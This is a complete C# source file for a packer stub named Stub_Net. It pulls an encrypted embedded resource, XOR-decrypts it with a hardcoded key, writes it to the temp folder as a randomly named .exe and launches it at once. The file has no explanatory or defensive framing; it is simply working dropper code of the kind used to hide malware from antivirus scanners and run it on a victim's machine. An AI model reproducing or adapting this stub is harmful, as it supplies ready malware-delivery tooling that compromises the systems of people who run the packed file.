using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;


namespace Stub_Net
{
    class Program
    {
        static void Main(string[] args)
        {
			byte[] array;
			using (Stream manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream("CsharpPacker"))
			{
				using (new StreamReader(manifestResourceStream))
				{
					array = new byte[manifestResourceStream.Length];
					manifestResourceStream.Read(array, 0, array.Length);
				}
			}
			string filename = Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";
			File.WriteAllBytes(filename ,Decrypt(array, new byte[] { 109, 121, 83, 101, 99, 114, 101, 116, 80, 97, 115, 115, 119, 111, 114, 100, 58, 41 }));
			Process.Start(filename);
		}
		private static byte[] Decrypt(byte[] text, byte[] key)
		{
			byte[] xor = new byte[text.Length];
			for (int i = 0; i < text.Length; i++)
			{
				xor[i] = (byte)(text[i] ^ key[i % key.Length]);
			}
			return xor;
		}
	}
}
